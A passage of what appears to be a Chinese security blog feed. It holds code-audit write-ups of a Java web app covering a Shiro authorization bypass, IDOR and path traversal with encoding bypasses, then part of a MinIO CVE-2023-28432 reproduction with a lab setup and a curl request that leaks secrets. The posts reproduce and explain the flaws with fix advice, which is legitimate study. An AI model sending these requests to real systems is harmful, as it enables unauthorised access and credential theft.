href="#未授权访问：" class="headerlink" title="未授权访问："></a>未授权访问：</h3><h4 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>查看shiro版本：<code>1.4.0</code></p><p><img src="/./../blog_image/image-20240316135647209.png" alt="image-20240316135647209"></p><p>存在可以绕过shiro授权，具体方法是</p><p><strong>SpringBoot(Tomcat)和Shiro对URL处理的差异化</strong></p><table><thead><tr><th>漏洞编号</th><th>CVE-2020-1957</th><th>CVE-2020-11989</th><th>CVE-2020-13933</th></tr></thead><tbody><tr><td>影响版本</td><td>Apache Shiro &lt; 1.5.1</td><td>Apache Shiro &lt; 1.5.2</td><td>Apache Shiro &lt; 1.6</td></tr><tr><td>payload</td><td>&#x2F;xxxx&#x2F;..;&#x2F;admin&#x2F;</td><td>&#x2F;;&#x2F;test&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr><tr><td>Shrio 处理结果</td><td>&#x2F;xxxx&#x2F;..</td><td>&#x2F;</td><td>&#x2F;admin&#x2F;</td></tr><tr><td>SpringBoot 处理结果</td><td>&#x2F;admin&#x2F;</td><td>&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr></tbody></table><p>查看shiro中的配置内容：</p><p><img src="/./../blog_image/image-20240316141817569.png" alt="image-20240316141817569"></p><p>主要存在<code>/js/**</code>的路径都可以匿名访问，根据CVE-2020-1957，我们请求<code>/js/..;/user/list</code>，shiro则会处理成<code>/js/..</code>，而sb则会处理成<code>/user/list</code>。<code>map.put(&quot;/**&quot;,&quot;user&quot;)</code>表示的是其他路径被配置为需要用户身份验证的请求。</p><p>根据这个可以构造以下poc：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/js/..;/user/list?pageSize=10&amp;pageNum=1&amp;username=&amp;ssex=&amp;status=&amp;_=1710569357397</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>实现了匿名访问：</p><p><img src="/./../blog_image/image-20240316142017981.png" alt="image-20240316142017981"></p><h4 id="代码审计：-1"><a href="#代码审计：-1" class="headerlink" title="代码审计："></a>代码审计：</h4><p>在<code>WebUtils</code>这个类中存在<code>decodeAndCleanUriString()</code>方法</p><p><img src="/./../blog_image/image-20240316155232928.png" alt="image-20240316155232928"></p><p>shiro鉴权中，调用了<code>decodeAndCleanUriString</code>，主要逻辑是获取<code>;</code>的索引然后判断是否存在，如果存在则截取<code>;</code>前的路径，否则直接返回。</p><p><img src="/./../blog_image/image-20240316155509117.png" alt="image-20240316155509117"></p><p>然后调用<code>PathMatchingFilterChainResolver</code>中的<code>getChain</code>方法，获取对应的filter过滤器：</p><p>当前匹配路径<code>/js/..;/user/list</code>会被处理成<code>/js/..</code>，由于<code>/js/**</code>是匿名访问，因此绕过了shiro的鉴权。</p><p><img src="/./../blog_image/image-20240316155833295.png" alt="image-20240316155833295"></p><p>在<code>getPathWithinServletMapping</code>中调用了<code>getPathWithinApplication</code>：</p><p><img src="/./../blog_image/image-20240316162944179.png" alt="image-20240316162944179"></p><p>这个方法主要是去除路径的<code>;</code>，把<code>//</code>替换成<code>/</code>：</p><p><img src="/./../blog_image/image-20240316162309998.png" alt="image-20240316162309998"></p><p><code>getRequestUri</code>中调用了<code>decodeAndCleanUriString</code>方法：</p><p><img src="/./../blog_image/image-20240316162139198.png" alt="image-20240316162139198"></p><p>这一步处理完就成了<code>/js/../user/list</code></p><p>然后继续调用<code>getPathWithinServletMapping</code>中的<code>getServletPath</code>方法，这个方法主要是获取servlet请求路径，这里明细了<code>/foo/</code>会被处理成<code>/foo</code>。</p><p>最终<code>/js/../user/list</code>会处理成<code>/user/list</code></p><h2 id="4-越权访问："><a href="#4-越权访问：" class="headerlink" title="4. 越权访问："></a>4. 越权访问：</h2><h3 id="获取用户信息："><a href="#获取用户信息：" class="headerlink" title="获取用户信息："></a>获取用户信息：</h3><h4 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user/getUserProfile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=942618d6-cb52-4ad4-bf48-4b35d4bfe8ce<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">userId</span><span class="hljs-operator">=</span><span class="hljs-number">41</span></span><br></code></pre></td></tr></table></figure><h4 id="代码审计：-2"><a href="#代码审计：-2" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看controller接口：</p><p><img src="/./../blog_image/image-20240316171137347.png" alt="image-20240316171137347"></p><p>可以看到查询个人信息的接口是传入id的，而且是不加以权限的，因此可以实现越权查询其他人的信息，如图所示：</p><p><img src="/./../blog_image/image-20240316171641975.png" alt="image-20240316171641975"></p><p>正确的做法应该是从session中获取当前登录的用户id，然后再查询，而不是由前端传入当前用户的id。</p><h3 id="更改任意用户信息："><a href="#更改任意用户信息：" class="headerlink" title="更改任意用户信息："></a>更改任意用户信息：</h3><h4 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>点击个人信息，抓包：</p><p><img src="/./../blog_image/image-20240317102553499.png" alt="image-20240317102553499"></p><p>将用户名和id填写上去，可以修改任意用户的信息：</p><p><img src="/./../blog_image/image-20240317102916819.png" alt="image-20240317102916819"></p><p>可以修改当前的状态。</p><h4 id="代码审计：-3"><a href="#代码审计：-3" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看service层接口：</p><p><img src="/./../blog_image/image-20240317103010518.png" alt="image-20240317103010518"></p><p>这里将用户名和密码设置为null，然后调用<code>updateNotNull</code>方法，因此这个接口不能修改当前用户名称和密码。</p><p><code>updateNotNull</code>调用了<code>updateByPrimaryKeySelective</code>，即只修改修改过的值。</p><p><img src="/./../blog_image/image-20240317103104649.png" alt="image-20240317103104649"></p><p>可以看到没有对user实体类的数据进行过滤，从而实现修改任意用户的信息，这里我修改了当前用户的状态，令修改的用户不能登录。</p><p><img src="/./../blog_image/image-20240317103332406.png" alt="image-20240317103332406"></p><p>修复建议：</p><p>应该获取当前登录的用户，然后只修改当前用户信息，而不是从前端传入数据去修改。如果从前端获取的数据，应该判断需要修改的用户是否是当前登录的用户。</p><h2 id="5-任意文件下载："><a href="#5-任意文件下载：" class="headerlink" title="5. 任意文件下载："></a>5. 任意文件下载：</h2><h3 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>目录穿越：</p><p>这个的fileName没有进行校验，所以导致了目录穿越。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/common/download?fileName=../../../../../../../../boot.ini&amp;delete=true</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=64231f02-080f-4fc2-aa56-ea286d532edf; rememberMe=T6B6VwfR1+Log+OLbsQ8dSGJX/7MsQC8ZpJvEEnegX7/uOvU0fFbgSuE/YzHR3pb9nAWS71q5O6IZY9ikoh2fLGPO+YUkTXKmnJVQOlqSFFrhxUk4fJsrvSwf674TrycHnatAWeahQKCbCi/hqDgHTHVca/Wq2JljjcEtGUnLrXZkLNBqOtm7zvGjv+JXWetUQR0cfiDM/ANn3Y/gAeG9T0JYtM5W8Vekp0o6QNvC0ZETZV1d8ZEZJR/SDwtoEmB8cViGjMbFNODPlyB0+S5mwRhNuMwx3fGENJXmCONq0B4pFGDNno6a/HijoscKhW94rQJOdHDz8bkfvcUYYJUNemvMyjKliJEGDyMy7bpMyRqPMNHkCVGaLftLEoXympTrpSz/7AUrqLXdzxcWk8DCOkSXUO1IntdkXeu/X7X9Maefkw9b4nnLIb4IrOhQJiDN7UIJ4Trb8riXeotSzX5tOdtAj87Y7GHdl/gYcZgMH8RHOdj3mUdimjf2pcwlVhZApokeox7iEsSQLBf9f+CXEhPbJNpDPWwdZrNUu3RqAy21vNkcGO7tWXZu67mMpgVEa73/NMRtKkR5Kw1JwjItEhL5yU/cOW8tbpziAfTkMejL0/2UMApQseIqCWyJfB3v+PxJePAbSQoMJTiVCviwrYW0WIyRF6gigmiSHaH4k+ERppDNKXet485wwPLDiOVmYFGyLEAx+ka9QQCEw+q0Xy9Zt7YrE0iv2kuzVhB1Legh5XwMdGjSAXNzQXN+MnzizPzkLl0bb/d380KEC0Vx5v1cyISiwvLIbFAZajfuGLQGuoqIZHzUy3kYLnsSzXX/gxSWnB29C0SB8+8XktZ6Hra8FKQkLB4hBmHTjwIvO6l2GnWRC2g3FyfLMvtsVUeaFaf2APZaPsC9Wj+DxL423Z64oGUGsHCw2FNLOZYVPFGFjQHAd26VarIARWPnn5lyvE6Ap+GEAZSkcrvGiAq2djWiZHvKkUbYYBek8Ll+JWdKUezU2AODjO7OKODUr/WoewBKA5IVOtxULyOzyhBZVeyFTt5olXI6ZDy6ZTxt5MJGGpKp+XnxXpiMjY224GVQYpq2q8vUqp07w2E08lr0ed3tAXvC79WivCgfgUOXKx+d5TeTrGU9TXpV27lBY6HSdxyqLtNO5VTDhKdV8e3Gx0A31hO2WU8KJmIIQKPC7Id217i5QTdtQvYJa5PC03VdI4JmEBuzTrZxdtHL7qz6/6rcGGwsn7Psksg/Pl9sIpT34sC1VRauIvXhjR5c7m3RJFjo7BG126XyULyv4GNEcngJcor8rOXJ0qeEF47J9OoB57XRIgmu3n0XD/Wi+EojJQuVPKW4T6ntr3675vjHNRHSV0JP7BwiC8lABjIS8I0pj8A07TgFq30SvbC4sLnS3OB1M6aJjvZ2vN4kzaPty/VB4O0ml57r8u0j42Udbg=<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>可以读取任意文件：</p><p><img src="/./../blog_image/image-20240317111025663.png" alt="image-20240317111025663"></p><p><strong>目录穿越绕过方案</strong></p><ol><li>进行URL编码：点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</li></ol><p>..&#x2F;  –&gt;  %2e%2e%2f</p><ol><li>进行16为Unicode编码：点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</li></ol><p>%u002e%u002e%u2215文件名</p><ol><li>进行双倍URL编码：点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</li><li>进行超长UTF-8 Unicode编码：</li></ol><ul><li>点–&gt;%c0%2e %e0$40%ae %c0ae</li><li>反斜杠–&gt;%c0af %e0%80af %c0%af</li><li>正斜杠–&gt;%c0%5c %c0%80%5c</li></ul><h3 id="代码审计：-4"><a href="#代码审计：-4" class="headerlink" title="代码审计："></a>代码审计：</h3><p>这里主要用到了<code>FileInputStream</code>去读取文件，java中的目录穿越是原生的，支持这种<code>../</code>目录。</p><p><img src="/./../blog_image/image-20240317110514579.png" alt="image-20240317110514579"></p><p>修复建议：</p><p>对传入的文件名需要进行判断，对于<code>../</code>这种的文件名需要进行拦截操作。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>minio从信息泄漏到RCE</title>
    <link href="/2023/12/26/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/"/>
    <url>/2023/12/26/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><p>Minio 是个基于 Golang 编写的开源对象存储套件，虽然轻量，却拥有着不错的性能。</p><p>minio存在漏洞利用，本次漏洞为<code>CVE-2023-28432</code>。</p><p>官方在 <a href="https://github.com/minio/minio/pull/8550">https://github.com/minio/minio/pull/8550</a> 中引入bootstrap API 并于 RELEASE.2019-12-17T23-16-33Z发布，用于验证服务器配置。在其<code>RELEASE.2023-03-20T20-16-18Z</code>版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码<code>MINIO_SECRET_KEY</code>和<code>MINIO_ROOT_PASSWORD</code>。</p><p>本次漏洞复现，需要使用到分布式部署。在单机情况下，复现失败。</p><p>注意点：</p><blockquote><p>版本号检测：</p><p>1.http-&gt; Get &#x2F;api&#x2F;v1&#x2F;check-version</p><p>2.版本小于RELEASE.2023-03-20T20-16-18Z则存在漏洞。</p><p>信息泄露：</p><p>POST &#x2F;minio&#x2F;bootstrap&#x2F;v1&#x2F;verify HTTP&#x2F;1.1</p></blockquote><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>参考<code>vulhub</code>的dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br>services:<br>  node1:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - --console-address<br>      - :<span class="hljs-number">9001</span><br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    ports:<br>      - <span class="hljs-number">9000</span>:<span class="hljs-number">9000</span><br>      - <span class="hljs-number">9001</span>:<span class="hljs-number">9001</span><br>    hostname: node1<br>    volumes:<br>      - ./mnt/data1:/mnt/data1<br>  node2:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node2<br>    volumes:<br>      - ./mnt/data2:/mnt/data2<br>  node3:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - MINIO_ROOT_PASSWORD=minioadmin-vulhub<br>    command:<br>      - minio<br>      - server<br>      - http://node1:<span class="hljs-number">9000</span>/mnt/data1<br>      - http://node2:<span class="hljs-number">9000</span>/mnt/data2<br>      - http://node3:<span class="hljs-number">9000</span>/mnt/data3<br>    hostname: node3<br>    volumes:<br>      - ./mnt/data3:/mnt/data3<br></code></pre></td></tr></table></figure><h1 id="1-未授权访问："><a href="#1-未授权访问：" class="headerlink" title="1.未授权访问："></a>1.未授权访问：</h1><h2 id="1-1-登录信息泄露："><a href="#1-1-登录信息泄露：" class="headerlink" title="1.1 登录信息泄露："></a>1.1 登录信息泄露：</h2><p>minio中web页面访问是<code>ip:9001</code>，而api服务访问则是<code>ip:9000</code></p><p>使用burp抓包，poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/minio/bootstrap/v1/verify</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9000<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US;q=0.9,en;q=0.8<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br></code></pre></td></tr></table></figure><p>或者使用curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST \<br>  http://10.10.10.129:9000/minio/bootstrap/v1/verify \<br>  -H <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept: */*&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Accept-Language: en-US;q=0.9,en;q=0.8&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Connection: close&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Cache-Control: max-age=0&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Length: 0&#x27;</span><br></code></pre></td></tr></table></figure><p>可以查看到相关信息：</p><p><img src="/./../blog_image/image-20231226215840140.png" alt="image-20231226215840140"></p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;MinioEndpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Legacy&quot;</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;SetCount&quot;</span>:<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;DrivesPerSet&quot;</span>:<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Endpoints&quot;</span>:[&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node1:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:true</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;User&quot;</span><span class="hljs-symbol">:null</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Host&quot;</span>:<span class="hljs-string">&quot;node2:9000&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Path&quot;</span>:<span class="hljs-string">&quot;/mnt/data2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawPath&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;OmitHost&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;ForceQuery&quot;</span><span class="hljs-symbol">:false</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawQuery&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Fragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;RawFragment&quot;</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;IsLocal&quot;</span><span class="hljs-symbol">:false</span>&#125;<span class="hljs-punctuation">,</span>&#123;<span class="hljs-string">&quot;Scheme&quot;</span>:<span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;Opaque&quot;</span>:<span 